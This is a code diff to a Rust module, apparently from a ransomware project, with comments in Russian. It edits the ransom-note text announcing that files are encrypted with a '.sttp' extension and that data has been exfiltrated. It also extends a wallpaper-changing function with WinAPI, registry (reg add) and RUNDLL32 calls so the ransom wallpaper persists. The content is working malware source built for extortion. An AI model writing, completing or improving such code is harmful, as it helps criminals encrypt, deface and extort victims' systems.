@@ -6,8 +6,6 @@ use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 #[cfg(target_os = "windows")]
 use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
-#[cfg(target_os = "windows")]
-use std::ptr;
 
 pub struct WindowsPlatform;
 
@@ -21,8 +19,6 @@ Your important files have been ENCRYPTED and now have ".sttp" extension.
 
 YOUR DATA HAS BEEN EXFILTRATED!
 All sensitive data from your system has been downloaded to our servers.
-
-If you refuse to pay, all data will be PUBLISHED on our leak site.
 
 EXFILTRATED DATA REPORT:
 {}
@@ -41,29 +37,35 @@ Recovery procedure:
         Ok(())
     }
 
-    // НОВАЯ ФУНКЦИЯ: Смена обоев
     #[cfg(target_os = "windows")]
     pub fn set_wallpaper(path: &str) -> Result<(), String> {
-        // Преобразуем путь в Wide String (UTF-16) для WinAPI
+        // 1. Метод через WinAPI (смена сразу)
         let wide_path: Vec<u16> = OsStr::new(path)
             .encode_wide()
             .chain(std::iter::once(0))
             .collect();
 
         unsafe {
-            let result = SystemParametersInfoW(
+            let _ = SystemParametersInfoW(
                 SPI_SETDESKWALLPAPER,
                 0,
                 wide_path.as_ptr() as *mut _,
                 SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
             );
-
-            if result != 0 {
-                Ok(())
-            } else {
-                Err("SystemParametersInfoW failed".to_string())
-            }
         }
+
+        // 2. Метод через Реестр (надежность и сохранение после перезагрузки)
+        // HKCU\Control Panel\Desktop -> Wallpaper
+        let _ = Command::new("reg")
+            .args(&["add", "HKCU\\Control Panel\\Desktop", "/v", "Wallpaper", "/t", "REG_SZ", "/d", path, "/f"])
+            .output();
+            
+        // Принудительное обновление параметров (на всякий случай)
+        let _ = Command::new("RUNDLL32.EXE")
+            .args(&["user32.dll,UpdatePerUserSystemParameters"])
+            .output();
+
+        Ok(())
     }
 
     #[cfg(target_os = "windows")]
@@ -80,7 +82,6 @@ Recovery procedure:
         Ok(())
     }
 
-    // Заглушки для Linux
     #[cfg(not(target_os = "windows"))]
     pub fn create_ransom_note(_: &str, _: &str) -> Result<(), String> { Ok(()) }
     #[cfg(not(target_os = "windows"))]
